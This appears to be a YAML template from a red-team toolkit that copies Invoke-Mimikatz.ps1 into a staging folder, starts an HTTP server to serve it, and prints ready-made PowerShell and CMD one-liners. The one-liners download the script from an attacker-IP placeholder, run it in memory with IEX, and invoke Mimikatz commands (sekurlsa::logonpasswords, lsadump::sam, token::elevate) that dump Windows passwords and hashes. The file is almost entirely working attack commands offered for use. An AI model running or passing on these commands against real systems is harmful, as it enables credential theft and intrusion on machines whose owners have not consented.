metadata:
  filename: "deliver-windows-Invoke-mimikatz.ps1.yaml"
  tags: ["windows", "domain", "cracking", "privesc"]
  created: "2025-03-29"
  authors: ["Unknown"]

content: |
  mkdir -p packstation/outbound; cp -n {{ tools_dir }}/mimikatz/Invoke-Mimikatz.ps1 packstation/outbound/; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      -----PowerShell-----                      '; \
  printf '%s\n' 'Preparation: Open Powershell with administrative privileges'; \
  printf '%s\n' "Deliver & Inject to memory: IEX (New-Object System.Net.Webclient).DownloadString('http://{{ attacker_ip }}:{{ delivery_outbound_port }}/Invoke-Mimikatz.ps1')"; \
  printf '%s\n' "Usage: Invoke-Mimikatz -Command '\"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\"'"; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                         -----CMD-----                          '; \
  printf '%s\n' "Deliver & Inject to memory & Execute (PS 64-bit): %windir%\Sysnative\WindowsPowerShell\v1.0\powershell.exe -Command \"& {IEX (New-Object System.Net.Webclient).DownloadString('http://{{ attacker_ip }}:{{ delivery_outbound_port }}/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '\\\"privilege::debug\\\" \\\"token::elevate\\\" \\\"sekurlsa::logonpasswords\\\" \\\"exit\\\"'}\""; \
  printf '%s\n' "Deliver & Inject to memory & Execute (PS 32-bit): powershell -Command \"& {IEX (New-Object System.Net.Webclient).DownloadString('http://{{ attacker_ip }}:{{ delivery_outbound_port }}/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '\\\"privilege::debug\\\" \\\"token::elevate\\\" \\\"sekurlsa::logonpasswords\\\" \\\"exit\\\"'}\""; \
  printf '%s\n' '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
